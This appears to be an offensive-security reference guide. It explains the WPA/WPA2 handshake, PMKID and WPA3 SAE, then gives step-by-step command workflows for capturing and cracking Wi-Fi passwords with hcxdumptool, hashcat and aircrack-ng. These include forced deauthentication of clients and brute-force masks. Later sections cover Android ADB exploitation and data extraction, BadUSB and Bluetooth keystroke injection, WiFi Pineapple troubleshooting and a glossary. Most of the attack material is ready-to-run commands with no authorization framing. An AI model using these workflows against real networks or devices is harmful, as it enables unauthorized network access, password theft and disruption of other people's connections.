## WPA/WPA2 4-Way Handshake

### Handshake Process
```
    Supplicant (Client)                    Authenticator (AP)
           │                                      │
           │                                      │
           │   ◄─────── Message 1 ───────────    │
           │   ANonce (AP's random number)        │
           │   Key Info: Pairwise, ACK            │
           │                                      │
           │   [Client calculates PTK:]           │
           │   PTK = PRF(PMK, ANonce, SNonce,     │
           │         AA, SA)                      │
           │                                      │
           │   ─────── Message 2 ────────────►   │
           │   SNonce (Client's random)           │
           │   MIC (Message Integrity Code)       │
           │   Key Info: Pairwise, MIC            │
           │   RSN IE (Security capabilities)     │
           │                                      │
           │   [AP calculates PTK & verifies MIC] │
           │                                      │
           │   ◄─────── Message 3 ───────────    │
           │   ANonce (same as Msg 1)             │
           │   MIC                                │
           │   Encrypted GTK                      │
           │   Key Info: Pairwise, Install,       │
           │             ACK, MIC, Secure         │
           │                                      │
           │   [Client installs PTK]              │
           │                                      │
           │   ─────── Message 4 ────────────►   │
           │   MIC                                │
           │   Key Info: Pairwise, MIC, Secure    │
           │                                      │
           │   [AP installs PTK, encrypted comm]  │
           ▼                                      ▼
```

### Key Derivation
```
PMK (Pairwise Master Key):
  PMK = PBKDF2(passphrase, SSID, 4096, 256)
  
  For WPA-Enterprise:
  PMK = First 256 bits of MSK from RADIUS

PTK (Pairwise Transient Key):
  PTK = PRF-X(PMK, "Pairwise key expansion",
              Min(AA,SA) || Max(AA,SA) ||
              Min(ANonce,SNonce) || Max(ANonce,SNonce))
  
  Where:
    AA = Authenticator MAC (AP)
    SA = Supplicant MAC (Client)
    X = 384 for CCMP, 512 for TKIP

PTK Components:
  ├── KCK (Key Confirmation Key): First 128 bits
  │   Used for: MIC calculation in handshake
  ├── KEK (Key Encryption Key): Next 128 bits
  │   Used for: Encrypting GTK in Message 3
  └── TK (Temporal Key): Remaining bits
      Used for: Data encryption (CCMP/TKIP)
```

## PMKID Attack Technical Details

### PMKID Calculation
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AA || SA)

Where:
  PMK = Pairwise Master Key (derived from passphrase)
  "PMK Name" = Literal string
  AA = Authenticator Address (AP MAC)
  SA = Supplicant Address (Client MAC)
  Output: First 128 bits of HMAC-SHA1

Attack Process:
1. Send Association Request to target AP
2. AP responds with EAPOL Message 1
3. Message 1 contains PMKID in RSN IE
4. Extract PMKID from packet
5. Offline crack:
   - For each password candidate:
     a. Calculate PMK = PBKDF2(candidate, SSID, 4096, 256)
     b. Calculate PMKID' = HMAC-SHA1-128(PMK, ...)
     c. Compare PMKID' with captured PMKID
     d. If match, password found
```

### PMKID Capture (hcxdumptool)
```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Capture PMKIDs (scans all channels)
sudo hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng

# Target specific AP
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
    --filterlist_ap=targets.txt --filtermode=2

# Convert to hashcat format
hcxpcapngtool -o hash.22000 capture.pcapng

# Crack with hashcat
hashcat -m 22000 hash.22000 wordlist.txt
```

## WPA3/SAE Protocol

### SAE (Simultaneous Authentication of Equals)
```
Dragonfly Key Exchange:

1. Commit Exchange:
   ┌─────────────┐                    ┌─────────────┐
   │   Station   │                    │     AP      │
   └──────┬──────┘                    └──────┬──────┘
          │                                  │
          │ ──── SAE Commit (scalar, elem) ───►
          │                                  │
          │ ◄─── SAE Commit (scalar, elem) ────
          │                                  │

2. Confirm Exchange:
          │                                  │
          │ ──── SAE Confirm (confirm) ──────►
          │                                  │
          │ ◄─── SAE Confirm (confirm) ───────
          │                                  │
   [Both derive PMK independently]           │

Key Properties:
├── Forward Secrecy: New keys each session
├── Offline Attack Resistant: No captured data to crack
├── Password-Authenticated: Uses password without exposing
└── Zero Knowledge Proof: Password never transmitted
```

### WPA3 Security Improvements
```
1. SAE (Dragonfly):
   - Replaces PSK-based 4-way handshake
   - Resistant to offline dictionary attacks
   - Forward secrecy per session

2. Protected Management Frames (PMF/802.11w):
   - Deauth/Disassoc frames are authenticated
   - Prevents deauthentication attacks
   - Required for WPA3

3. Opportunistic Wireless Encryption (OWE):
   - Encryption for open networks
   - No password required
   - Protects against passive sniffing

4. 192-bit Security Mode:
   - CNSA Suite compliant
   - For government/enterprise
   - GCMP-256 encryption
```

# CRACKING REFERENCE GUIDE

## Hashcat Reference

### WPA/WPA2/WPA3 Cracking

```bash
# Mode 22000: WPA-PBKDF2-PMKID+EAPOL (unified format)
# This is the modern format for all WPA attacks

# Basic dictionary attack
hashcat -m 22000 capture.22000 wordlist.txt

# With rules
hashcat -m 22000 capture.22000 wordlist.txt -r best64.rule
hashcat -m 22000 capture.22000 wordlist.txt -r OneRuleToRuleThemAll.rule

# Multiple wordlists
hashcat -m 22000 capture.22000 wordlist1.txt wordlist2.txt wordlist3.txt

# Combination attack (word1+word2)
hashcat -m 22000 capture.22000 -a 1 words1.txt words2.txt

# Brute force - 8 digits
hashcat -m 22000 capture.22000 -a 3 ?d?d?d?d?d?d?d?d

# Brute force - 8 lowercase
hashcat -m 22000 capture.22000 -a 3 ?l?l?l?l?l?l?l?l

# Brute force - custom charset
hashcat -m 22000 capture.22000 -a 3 -1 ?l?d ?1?1?1?1?1?1?1?1

# Hybrid: wordlist + digits
hashcat -m 22000 capture.22000 -a 6 wordlist.txt ?d?d?d?d

# Hybrid: digits + wordlist
hashcat -m 22000 capture.22000 -a 7 ?d?d?d?d wordlist.txt

# Mask with known pattern (e.g., Name1234)
hashcat -m 22000 capture.22000 -a 3 ?u?l?l?l?d?d?d?d

# Prince attack (word generation)
pp64.bin < wordlist.txt | hashcat -m 22000 capture.22000
```

### Hashcat Charsets
```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s = !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00-0xff (binary)

Custom charsets:
-1 ?l?u      # Lower and upper
-2 ?l?d      # Lower and digits
-3 abc123    # Specific characters
-4 ?d?s      # Digits and special
```

### Converting Captures to Hashcat Format
```bash
# From pcapng (hcxtools)
hcxpcapngtool -o output.22000 capture.pcapng

# From cap (aircrack-ng suite)
# First convert cap to pcapng
editcap -F pcapng capture.cap capture.pcapng
hcxpcapngtool -o output.22000 capture.pcapng

# Alternative: cap2hccapx (deprecated but still works)
cap2hccapx capture.cap output.hccapx

# From hccapx to 22000
hcxhash2cap -o output.22000 old_format.hccapx

# Verify hash format
head -1 output.22000
# Should look like: WPA*02*[hex]*[hex]*[SSID_hex]*...
```

## Aircrack-ng Reference

### Complete Workflow

```bash
# 1. Check interface and driver
airmon-ng

# 2. Kill interfering processes
airmon-ng check kill

# 3. Enable monitor mode
airmon-ng start wlan0
# Interface becomes wlan0mon

# 4. Scan for networks
airodump-ng wlan0mon

# 5. Target specific network
airodump-ng -c [channel] --bssid [AP_MAC] -w capture wlan0mon

# 6. Deauth to force handshake (new terminal)
aireplay-ng --deauth 10 -a [AP_MAC] wlan0mon
# Or target specific client:
aireplay-ng --deauth 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon

# 7. Wait for handshake (shown in airodump-ng)
# "WPA handshake: XX:XX:XX:XX:XX:XX"

# 8. Stop capture, crack
aircrack-ng capture-01.cap -w wordlist.txt
```

### Aircrack-ng Options

```bash
# Dictionary attack
aircrack-ng -w wordlist.txt capture.cap

# Multiple wordlists
aircrack-ng -w list1.txt,list2.txt,list3.txt capture.cap

# Specify target BSSID
aircrack-ng -b XX:XX:XX:XX:XX:XX -w wordlist.txt capture.cap

aircrack-ng -e "NetworkName" -w wordlist.txt capture.cap

# Use all CPUs
aircrack-ng -p 8 -w wordlist.txt capture.cap

# Quiet mode (less output)
aircrack-ng -q -w wordlist.txt capture.cap

aircrack-ng -l output.txt -w wordlist.txt capture.cap

# Check if handshake exists
aircrack-ng capture.cap
```

# MOBILE DEVICE ATTACKS

## Android Attack Surface

### USB Debug Exploitation
```
Requirements:
- USB Debugging enabled on device
- ADB connection authorized
- Device unlocked (or previously authorized)

Attack Flow:
1. Connect device via USB
2. If debugging enabled and authorized:
   adb devices  # Should show device
   adb shell    # Get shell access
   
Available Actions:
- File system access
- App installation/removal
- Screen capture
- Keylogging (via accessibility)
- Data extraction
```

### ADB Commands Reference
```bash
# Device interaction
adb devices                    # List connected devices
adb shell                      # Interactive shell
adb root                       # Restart ADB with root (if rooted)

# Information gathering
adb shell dumpsys             # System info dump
adb shell pm list packages    # List installed apps
adb shell getprop             # System properties
adb shell cat /proc/version   # Kernel version
adb shell settings list system # System settings

# File operations
adb pull /path/on/device /local/path
adb push /local/file /path/on/device

# App management
adb install app.apk           # Install app
adb uninstall package.name    # Uninstall app

# Screen capture
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png
```

### Android Limitations
```
Without Root:
- Limited file system access
- Cannot access other app data
- Cannot modify system files
- Cannot capture keystrokes (easily)

USB Restricted Mode:
- After 1 hour of lock, USB data disabled
- Requires unlock to re-enable
- Introduced in Android 9+

Google Play Protect:
- Scans for malicious apps
- May block sideloaded APKs
- Can be disabled but requires user action
```

## iOS Attack Surface

### iOS USB Restrictions
```
USB Restricted Mode (iOS 11.4.1+):
- USB data connection disabled after 1 hour of lock
- Only charging allowed
- Requires device unlock to re-enable

Attack Windows:
1. Device is unlocked
2. Within 1 hour of last unlock
3. Device paired with trusted computer
4. USB Restricted Mode disabled (Settings)
```

### iOS Limited Attacks
```
With Paired Computer:
- iTunes backup extraction
- File browsing (limited)
- Screenshot capture
- App installation

Without Pairing:
- Charge only
- No data access
- No HID attacks when locked
- Extremely limited surface
```

### Flipper Zero + Mobile
```
Flipper BadUSB vs Mobile:

Android (USB Debug OFF):
- Device may prompt for input method
- Limited effectiveness
- May work for some automation

Android (USB Debug ON):
- Can potentially execute ADB commands
- Requires prior authorization

iOS:
- BadUSB largely ineffective
- USB Restricted Mode blocks access
- No terminal to target

Alternative: Bluetooth HID
- Pair as Bluetooth keyboard
- Requires user acceptance
- Can inject keystrokes
- Works on both Android/iOS
```

# TROUBLESHOOTING GUIDE

## Flipper Zero Common Issues

### Script Not Running
```
Problem: Script doesn't execute when run

Solutions:
1. Check file encoding
   - Must be UTF-8 (no BOM)
   - Use Notepad++ or VS Code to verify
   - Save as: UTF-8 without BOM

2. Check file extension
   - Must be .txt
   - Not .txt.txt (hidden extensions)

3. Check file location
   - Must be in /badusb/ on SD card
   - Not in subdirectory (some firmwares)

4. Verify syntax
   - No invisible characters
   - Unix line endings preferred
   - No tabs (use spaces)
```

### Characters Typed Incorrectly
```
Problem: Wrong characters appear when typing

Solutions:
1. Keyboard layout mismatch
   - Target uses different layout
   - Add: DEFAULT_STRING_DELAY 30
   - Use: ALTCHAR for special chars
   - Create layout-specific version

2. Timing issues
   - Increase STRING_DELAY
   - Add delays between characters
   
3. USB enumeration incomplete
   - Increase initial DELAY (3000+)
```

### Script Stops Midway
```
Problem: Payload starts but doesn't complete

Solutions:
1. Target system lag
   - Increase DELAY values
   - Add delays after application launches
   - Use DEFAULT_DELAY 200

2. Window focus lost
   - Application didn't open in time
   - Add DELAY after ENTER
   - Verify window focused before typing

3. Privilege issues
   - UAC blocked action
   - Application requires elevation
   - User intervention needed
```

### Device Not Recognized as Keyboard
```
Problem: Computer doesn't see Flipper as keyboard

Solutions:
1. USB connection issue
   - Try different cable
   - Try different USB port
   - Avoid USB hubs

2. Driver issue (rare)
   - Windows: Should be automatic
   - Try reinserting device
   - Check Device Manager

3. BadUSB mode not active
   - Ensure you ran the script
   - Check Flipper display for status
```

## WiFi Pineapple Pager Common Issues

### Payload Permission Denied
```
Problem: ./payload.sh: Permission denied

Solution:
chmod +x payload.sh

Or in script:
bash payload.sh
```

### Command Not Found
```
Problem: command not found errors

Solutions:
1. Check PATH
   - Use full paths: /usr/bin/command
   
2. Install missing package
   - opkg update
   - opkg install <package>

3. Verify command exists
   - which <command>
   - type <command>
```

### Interface Not Found
```
Problem: wlan0 or wlan1 not found

Solutions:
1. Check interfaces
   - iwconfig
   - ip link show

2. Interface down
   - ifconfig wlan0 up
   
3. Driver issue
   - Reboot device
   - Check dmesg for errors
```

### No Display Output
```
Problem: NOTIFY doesn't show on screen

Solutions:
1. Check syntax
   - NOTIFY "message" (with quotes)
   
2. Display service issue
   - Verify display daemon running
   
3. Buffer full
   - Clear existing notifications
```

### WiFi Scan Empty
```
Problem: No networks found

Solutions:
1. Interface in wrong mode
   - airmon-ng stop wlan0mon
   - iwconfig wlan0
   
2. No networks in range
   - Try different location
   - Check antenna connection
   
3. Channel restrictions
   - iw reg set US
   - Verify regulatory domain
```

# GLOSSARY

```
A
───
AMSI - Antimalware Scan Interface: Windows feature that allows 
       applications to integrate with antimalware products.

ANonce - Authenticator Nonce: Random number generated by the AP 
         during WPA handshake.

AP - Access Point: Device that allows wireless clients to connect 
     to a network.

ARP - Address Resolution Protocol: Protocol for mapping IP addresses 
      to MAC addresses.

B
───
BadUSB - Attack technique where USB devices masquerade as keyboards 
         to inject malicious commands.

BSSID - Basic Service Set Identifier: MAC address of the wireless 
        access point.

BLE - Bluetooth Low Energy: Low-power wireless technology for 
      short-range communication.

C
───
C2/C&C - Command and Control: Server/infrastructure used to 
         communicate with compromised systems.

CCMP - Counter Mode CBC-MAC Protocol: Encryption protocol used 
       in WPA2.

CDC - Communications Device Class: USB specification for serial 
      communication.

D
───
Deauth - Deauthentication: WiFi management frame used to 
         disconnect clients.

DFU - Device Firmware Upgrade: Mode for updating device firmware.

DNS - Domain Name System: Protocol for resolving domain names 
      to IP addresses.

E
───
EAPOL - Extensible Authentication Protocol over LAN: Protocol 
        used in WPA authentication.

EDR - Endpoint Detection and Response: Security solution for 
      detecting and responding to threats.

ETW - Event Tracing for Windows: Windows logging and tracing 
      facility.

Evil Twin - Rogue access point that impersonates a legitimate 
            network.

F
───
FSK - Frequency-Shift Keying: Digital modulation technique.

G
───
GTK - Group Temporal Key: Key used for broadcast/multicast 
      encryption in WPA.

GPIO - General Purpose Input/Output: Programmable hardware pins.

H
───
Handshake - Authentication exchange between client and AP in WPA.

HID - Human Interface Device: USB device class for keyboards, 
      mice, etc.

I
───
iButton - 1-Wire device in a button-shaped package.

IR - Infrared: Electromagnetic radiation used for remote controls.

K
───
Karma Attack - WiFi attack where rogue AP responds to all probe 
               requests.

KEK - Key Encryption Key: Component of PTK used to encrypt GTK.

KCK - Key Confirmation Key: Component of PTK used for MIC 
      calculation.

L
───
LOLBins - Living Off the Land Binaries: Legitimate system tools 
          used maliciously.

M
───
MAC - Media Access Control: Hardware address of network interface.

MIC - Message Integrity Code: Cryptographic checksum in WPA 
      handshake.

MITM - Man-in-the-Middle: Attack where attacker intercepts 
       communication.

Monitor Mode - WiFi mode that allows capturing all wireless frames.

N
───
NFC - Near Field Communication: Short-range wireless technology 
      (13.56 MHz).

O
───
OOK - On-Off Keying: Simple modulation where signal presence 
      indicates bit value.

OSINT - Open Source Intelligence: Information gathering from 
        public sources.

P
───
Packet Injection - Sending crafted packets into a network.

PID - Product ID: 16-bit identifier for USB devices.

PMF - Protected Management Frames: WPA3 feature protecting 
      management frames.

PMK - Pairwise Master Key: Master key derived from password 
      in WPA.

PMKID - PMK Identifier: Hash used to identify PMK, target of 
        clientless attack.

Probe Request - WiFi frame sent by client searching for networks.

PTK - Pairwise Transient Key: Session key derived during handshake.

R
───
RFID - Radio Frequency Identification: Wireless technology for 
       reading tags.

Rogue AP - Unauthorized access point, often malicious.

RSN - Robust Security Network: Security framework for 802.11i 
      (WPA2).

S
───
SAE - Simultaneous Authentication of Equals: WPA3 authentication 
      protocol.

SIP - System Integrity Protection: macOS security feature.

SNonce - Supplicant Nonce: Random number generated by client 
         during handshake.

SSID - Service Set Identifier: Name of wireless network.

Sub-GHz - Radio frequencies below 1 GHz (300-928 MHz typically).

SysRq - System Request: Linux kernel debugging/recovery feature.

T
───
TK - Temporal Key: Component of PTK used for data encryption.

TKIP - Temporal Key Integrity Protocol: Encryption protocol 
       (WPA, deprecated).

U
───
UAC - User Account Control: Windows security feature for 
      privilege elevation.

USB Rubber Ducky - HID injection device by Hak5.

V
───
VID - Vendor ID: 16-bit identifier for USB device manufacturer.

W
───
WIDS - Wireless Intrusion Detection System.

WPA - WiFi Protected Access: Security protocol for wireless 
      networks.

WPA2 - WiFi Protected Access 2: Current standard (802.11i).

WPA3 - WiFi Protected Access 3: Latest standard with SAE.

WPS - WiFi Protected Setup: Simplified connection method 
      (vulnerable).
```
